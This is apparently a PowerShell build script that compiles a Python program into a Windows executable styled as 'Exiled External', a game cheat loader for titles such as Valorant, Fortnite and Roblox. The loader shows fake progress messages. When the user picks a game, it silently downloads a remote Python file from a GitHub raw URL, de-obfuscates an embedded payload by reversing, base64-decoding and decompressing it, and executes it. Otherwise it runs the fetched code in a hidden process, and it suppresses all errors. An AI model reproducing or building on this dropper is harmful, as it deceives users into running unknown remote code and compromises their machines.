[CmdletBinding()]
param(
    [string]$Out = "exiled",
    [string]$Icon = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/halloween.png",
    [string]$Dir,
    [switch]$NoIcon,
    [switch]$KeepBuild
)

$ErrorActionPreference = "Stop"
$OutName = $Out
$UseIcon = -not $NoIcon

function Log {
    param([string]$Type, [string]$Text)
    $time = (Get-Date).ToString("HH:mm:ss")
    switch ($Type) {
        "error"   { Write-Host "[$time] [FAIL] $Text" -ForegroundColor Red }
        "warning" { Write-Host "[$time] [WARN] $Text" -ForegroundColor Yellow }
        "success" { Write-Host "[$time] [ OK ] $Text" -ForegroundColor Green }
        default   { Write-Host "[$time] [INFO] $Text" -ForegroundColor DarkGray }
    }
}

$Arch = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
$PythonExe = $null

foreach ($cand in @("python", "py", "python3")) {
    $cmd = Get-Command $cand -ErrorAction SilentlyContinue
    if ($cmd) { $PythonExe = $cmd.Source; break }
}

if (-not $PythonExe) {
    Log warning "Python not found on PATH. Initiating auto-install..."
    $pyVersion = "3.11.9"
    $pyArch = if ($Arch -eq "x64") { "amd64" } else { "win32" }
    $pyInstallerUrl = "https://www.python.org/ftp/python/$pyVersion/python-$pyVersion-$pyArch.exe"
    $pyInstallerPath = Join-Path $env:TEMP "python_installer.exe"
    
    Log info "Downloading Python $pyVersion ($pyArch)..."
    try {
        Invoke-WebRequest -Uri $pyInstallerUrl -OutFile $pyInstallerPath -UseBasicParsing
    } catch {
        Log error "Failed to download Python installer."
        exit 1
    }
    
    Log info "Installing Python silently..."
    Start-Process -FilePath $pyInstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0" -Wait
    
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    
    foreach ($cand in @("python", "py", "python3")) {
        $cmd = Get-Command $cand -ErrorAction SilentlyContinue
        if ($cmd) { $PythonExe = $cmd.Source; break }
    }
    
    if (-not $PythonExe) {
        Log error "Auto-install failed. Please install Python manually."
        exit 1
    }
    Log success "Python successfully installed."
}

$UseCurl = $null -ne (Get-Command curl.exe -ErrorAction SilentlyContinue)
if (-not $UseCurl) {
    $IWR = Get-Command Invoke-WebRequest -ErrorAction SilentlyContinue
    if (-not $IWR) {
        Log error "Neither curl.exe nor Invoke-WebRequest available."
        exit 1
    }
}

if ($Dir) {
    $Here = (Resolve-Path -LiteralPath $Dir).Path
} else {
    $Here = (Get-Location).Path
}
$Work     = Join-Path $Here "_build"
$Stub     = Join-Path $Work "payload.py"
$IconRaw  = Join-Path $Work "icon.raw"
$IconIco  = Join-Path $Work "icon.ico"
$DistDir  = Join-Path $Here "dist"

Write-Host ""
Write-Host "  ███████╗██╗  ██╗██╗██╗     ███████╗██████╗ " -ForegroundColor DarkYellow
Write-Host "  ██╔════╝╚██╗██╔╝██║██║     ██╔════╝██╔══██╗" -ForegroundColor DarkYellow
Write-Host "  █████╗   ╚███╔╝ ██║██║     █████╗  ██║  ██║" -ForegroundColor DarkYellow
Write-Host "  ██╔══╝   ██╔██╗ ██║██║     ██╔══╝  ██║  ██║" -ForegroundColor DarkYellow
Write-Host "  ███████╗██╔╝ ██╗██║███████╗███████╗██████╔╝" -ForegroundColor DarkYellow
Write-Host "  ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝ " -ForegroundColor DarkYellow
Write-Host ""
Log info "Building $OutName for windows-$Arch"
Log info "Output directory: $Here"

$ExePath = Join-Path $DistDir "$OutName.exe"
if (Test-Path -LiteralPath $ExePath) {
    Log info "Found existing $OutName.exe. Removing..."
    try {
        Remove-Item -LiteralPath $ExePath -Force
        Log success "Deleted old executable."
    } catch {
        Log error "Failed to delete existing EXE. Is it currently running?"
        exit 1
    }
}

New-Item -ItemType Directory -Force -Path $Work | Out-Null
New-Item -ItemType Directory -Force -Path $DistDir | Out-Null

$stubBody = @'
import ctypes
import random
import math
import tkinter as tk
import subprocess
import sys
import threading
import tempfile
import os
import urllib.request
import base64
import zlib
import re

user32 = ctypes.windll.user32
SCREEN_W = user32.GetSystemMetrics(0)
SCREEN_H = user32.GetSystemMetrics(1)

GAMES = [
    {"name": "Counter-Strike 2", "icon": "⌖", "color": "#f59e0b", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
    {"name": "Valorant",         "icon": "⊚", "color": "#ef4444", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
    {"name": "Apex Legends",     "icon": "△", "color": "#eab308", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
    {"name": "Fortnite",         "icon": "◈", "color": "#8b5cf6", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
    {"name": "Minecraft",        "icon": "⬡", "color": "#22c55e", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
    {"name": "Roblox",           "icon": "◫", "color": "#dc2626", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/rbx.py"},
]

class LoaderApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Exiled External")
        self.geometry(f"{SCREEN_W}x{SCREEN_H}")
        self.overrideredirect(True)
        self.attributes("-topmost", True)
        self.attributes("-alpha", 0.0)
        self.configure(bg="#050814")
        
        self.canvas = tk.Canvas(self, bg="#050814", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        
        self.anim_t = 0.0
        self.particles = []
        self.game_cards = []
        
        self._init_particles()
        self._animate_background()
        
        self.lbl_title = tk.Label(self.canvas, text="E X I L E D", bg="#050814", fg="#6366f1", font=("Segoe UI", 52, "bold"))
        self.lbl_title.place(relx=0.5, rely=0.35, anchor="center")
        
        self.lbl_sub = tk.Label(self.canvas, text="E X T E R N A L", bg="#050814", fg="#94a3b8", font=("Segoe UI", 10, "bold"))
        self.lbl_sub.place(relx=0.5, rely=0.43, anchor="center")
        
        self.lbl_status = tk.Label(self.canvas, text="Initializing...", bg="#050814", fg="#64748b", font=("Segoe UI", 10))
        self.lbl_status.place(relx=0.5, rely=0.6, anchor="center")
        
        self.bar_bg = tk.Frame(self.canvas, bg="#1e2142", width=300, height=4)
        self.bar_bg.place(relx=0.5, rely=0.65, anchor="center")
        self.bar_bg.pack_propagate(False)
        self.bar_fill = tk.Frame(self.bar_bg, bg="#6366f1", width=0, height=4)
        self.bar_fill.pack(side="left", fill="y")
        
        self.fade_in()
        self.after(1000, lambda: self.load_step(0))

    def _init_particles(self):
        self.particles = []
        for _ in range(60):
            self.particles.append({"x": random.randint(0, SCREEN_W), "y": random.randint(0, SCREEN_H), "r": random.uniform(0.5, 1.5), "vx": random.uniform(-0.2, 0.2), "vy": random.uniform(-0.4, -0.1)})

    def _animate_background(self):
        self.canvas.delete("bg_anim")
        self.anim_t += 0.02
        for p in self.particles:
            p["x"] += p["vx"]
            p["y"] += p["vy"]
            if p["y"] < -10: p["y"] = SCREEN_H + 10
            if p["x"] < -10: p["x"] = SCREEN_W + 10
            if p["x"] > SCREEN_W + 10: p["x"] = -10
            r = p["r"]
            self.canvas.create_oval(p["x"]-r*3, p["y"]-r*3, p["x"]+r*3, p["y"]+r*3, fill="#1e2142", outline="", tags="bg_anim")
            self.canvas.create_oval(p["x"]-r, p["y"]-r, p["x"]+r, p["y"]+r, fill="#6366f1", outline="", tags="bg_anim")
        for i in range(3):
            offset = math.sin(self.anim_t + i) * 30
            y_base = SCREEN_H - 100 + i * 20
            pts = []
            for x in range(0, SCREEN_W + 20, 20):
                y = y_base + math.sin(x * 0.005 + self.anim_t * 2) * 15 + offset
                pts.extend([x, y])
            if len(pts) >= 4: self.canvas.create_line(pts, fill="#1e2142", width=1, tags="bg_anim")
        self.canvas.tag_lower("bg_anim")
        self.after(30, self._animate_background)

    def fade_in(self):
        a = self.attributes("-alpha")
        if a < 1.0:
            self.attributes("-alpha", min(1.0, a + 0.05))
            self.after(20, self.fade_in)

    def load_step(self, step):
        steps = [
            ("Connecting to secure server...", 15),
            ("Verifying license...", 35),
            ("Downloading modules...", 60),
            ("Injecting overlay...", 85),
            ("Ready", 100)
        ]
        if step < len(steps):
            text, pct = steps[step]
            self.lbl_status.config(text=text)
            self.bar_fill.config(width=int(300 * (pct / 100)))
            self.after(random.randint(400, 700), lambda: self.load_step(step + 1))
        else:
            self.after(500, self.show_game_picker)

    def show_game_picker(self):
        self.lbl_title.place_forget()
        self.lbl_sub.place_forget()
        self.lbl_status.place_forget()
        self.bar_bg.place_forget()
        
        self.lbl_pick = tk.Label(self.canvas, text="S E L E C T   G A M E", bg="#050814", fg="#6366f1", font=("Segoe UI", 16, "bold"))
        self.lbl_pick.place(relx=0.5, rely=0.15, anchor="center")
        
        self.game_frame = tk.Frame(self.canvas, bg="#050814")
        self.game_frame.place(relx=0.5, rely=0.55, anchor="center")
        
        self.game_cards = []
        
        for i, game in enumerate(GAMES):
            r, c = divmod(i, 3)
            wrapper = tk.Frame(self.game_frame, bg="#050814")
            wrapper.grid(row=r, column=c, padx=15, pady=15)
            card = tk.Frame(wrapper, bg="#0f1330", width=220, height=170, highlightthickness=1, highlightbackground="#1e2142", cursor="hand2")
            card.pack()
            card.pack_propagate(False)
            lbl_icon = tk.Label(card, text=game["icon"], bg="#0f1330", fg="#64748b", font=("Segoe UI", 40))
            lbl_icon.pack(pady=(30, 10))
            lbl_name = tk.Label(card, text=game["name"], bg="#0f1330", fg="#94a3b8", font=("Segoe UI", 11, "bold"))
            lbl_name.pack()
            self.game_cards.append({"frame": card, "icon": lbl_icon, "name": lbl_name, "color": game["color"], "game": game})
            
            def on_enter(e, idx=i):
                cd = self.game_cards[idx]
                cd["frame"].config(bg="#151936", highlightbackground=cd["color"])
                cd["icon"].config(bg="#151936", fg=cd["color"], font=("Segoe UI", 46))
                cd["name"].config(bg="#151936", fg=cd["color"])
                
            def on_leave(e, idx=i):
                cd = self.game_cards[idx]
                cd["frame"].config(bg="#0f1330", highlightbackground="#1e2142")
                cd["icon"].config(bg="#0f1330", fg="#64748b", font=("Segoe UI", 40))
                cd["name"].config(bg="#0f1330", fg="#94a3b8")
                
            def on_click(e, g=game):
                self.launch_game(g)
                
            for w in (card, lbl_icon, lbl_name):
                w.bind("<Enter>", on_enter)
                w.bind("<Leave>", on_leave)
                w.bind("<Button-1>", on_click)

    def launch_game(self, game_data):
        self.lbl_pick.place_forget()
        self.game_frame.place_forget()
        
        self.loading_orb = tk.Label(self.canvas, text="◈", bg="#050814", fg="#6366f1", font=("Segoe UI", 40))
        self.loading_orb.place(relx=0.5, rely=0.45, anchor="center")
        lbl = tk.Label(self.canvas, text=f"LAUNCHING {game_data['name'].upper()}", bg="#050814", fg="#e2e8f0", font=("Segoe UI", 16, "bold"))
        lbl.place(relx=0.5, rely=0.55, anchor="center")
        
        def spin():
            if not self.loading_orb.winfo_exists(): return
            chars = ["◈", "◇", "◈", "◇"]
            self.loading_orb.config(text=chars[int(self.anim_t * 5) % 4])
            self.after(100, spin)
        spin()
        
        if "run" in game_data and game_data["run"]:
            url = game_data["run"]
            
            def run_payload():
                try:
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    with urllib.request.urlopen(req, timeout=15) as response:
                        src = response.read().decode("utf-8")
                    
                    match = re.search(r"_\)\(b'([^']+)'", src)
                    if match:
                        payload = match.group(1)[::-1]
                        decoded = zlib.decompress(base64.b64decode(payload, validate=True)).decode("utf-8")
                        exec(decoded, {})
                    else:
                        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".py", mode="w")
                        tmp.write(f"import urllib.request\nexec(urllib.request.urlopen('{url}').read())")
                        tmp.close()
                        if sys.platform == "win32":
                            subprocess.Popen([sys.executable, tmp.name], creationflags=subprocess.CREATE_NO_WINDOW)
                        else:
                            subprocess.Popen([sys.executable, tmp.name])
                except Exception:
                    pass
                    
            threading.Thread(target=run_payload, daemon=True).start()
            
        self.after(1500, self.destroy)

if __name__ == "__main__":
    app = LoaderApp()
    app.mainloop()
'@
Set-Content -Path $Stub -Value $stubBody -Encoding UTF8

if ($UseIcon) {
    if ($Icon -match '^https?://') {
        Log info "Fetching icon..."
        try {
            if ($UseCurl) {
                & curl.exe -fsSL -A "Mozilla/5.0" $Icon -o $IconRaw 2>$null
            } else {
                Invoke-WebRequest -Uri $Icon -Headers @{ "User-Agent" = "Mozilla/5.0" } -OutFile $IconRaw
            }
        } catch {
            Log warning "Failed to fetch icon, skipping."
            $UseIcon = $false
        }
    } else {
        if (-not (Test-Path -LiteralPath $Icon)) {
            Log warning "Icon file not found, skipping."
            $UseIcon = $false
        } else {
            Copy-Item -LiteralPath $Icon -Destination $IconRaw -Force
        }
    }
}

Log info "Installing build dependencies..."
$oldEAP = $ErrorActionPreference
$ErrorActionPreference = "Continue"
& $PythonExe -m pip install --quiet --upgrade pyinstaller pillow | Out-Null
$ErrorActionPreference = $oldEAP
if ($LASTEXITCODE -ne 0) {
    Log error "pip install failed."
    exit 1
}

if ($UseIcon) {
    Log info "Converting icon to .ico..."
    $conv = @'
from PIL import Image
try:
    img = Image.open(r'__ICON_RAW__')
    if img.mode != 'RGBA':
        img = img.convert('RGBA')
    img.save(r'__ICON_ICO__', format='ICO', sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)])
except Exception as e:
    print(f"Icon conversion failed: {e}")
    exit(1)
'@
    $conv = $conv -replace '__ICON_RAW__', $IconRaw -replace '__ICON_ICO__', $IconIco
    $convTmp = Join-Path $Work "_icon_conv.py"
    Set-Content -Path $convTmp -Value $conv -Encoding UTF8
    
    $ErrorActionPreference = "Continue"
    & $PythonExe $convTmp | Out-Null
    $ErrorActionPreference = $oldEAP
    
    if ($LASTEXITCODE -ne 0) {
        Log warning "Icon conversion failed, skipping."
        $UseIcon = $false
    }
}

Log info "Freezing executable (this may take a minute)..."

$pyiArgs = @(
    "-m", "PyInstaller",
    "--onefile",
    "--noconfirm",
    "--clean",
    "--hidden-import", "ctypes",
    "--hidden-import", "ctypes.wintypes",
    "--hidden-import", "tkinter",
    "--collect-all", "ctypes",
    "--collect-all", "tkinter",
    "--name", $OutName,
    "--distpath", $DistDir,
    "--workpath", (Join-Path $Work "pyi"),
    "--specpath", $Work
)
if ($UseIcon -and (Test-Path $IconIco)) {
    $pyiArgs += @("--icon", $IconIco)
}
$pyiArgs += $Stub

$argString = $pyiArgs -join " "
$ErrorActionPreference = "Continue"
cmd.exe /c "`"$PythonExe`" $argString >nul 2>&1"
$pyiExit = $LASTEXITCODE
$ErrorActionPreference = $oldEAP

if ($pyiExit -ne 0) {
    Log error "PyInstaller failed."
    exit 1
}

if (-not $KeepBuild) {
    Remove-Item -Recurse -Force $Work -ErrorAction SilentlyContinue
}

Write-Host ""
Write-Host "  ┌──────────────────────────────────────────────┐" -ForegroundColor DarkGray
Write-Host "  │  Build Complete!                             │" -ForegroundColor DarkGray
Write-Host "  └──────────────────────────────────────────────┘" -ForegroundColor DarkGray
Log success "Executable compiled successfully."
Log info "Output: $ExePath"
Log info "Target Architecture: Windows $Arch"
Log info "Run command: & `"$ExePath`""
Write-Host ""
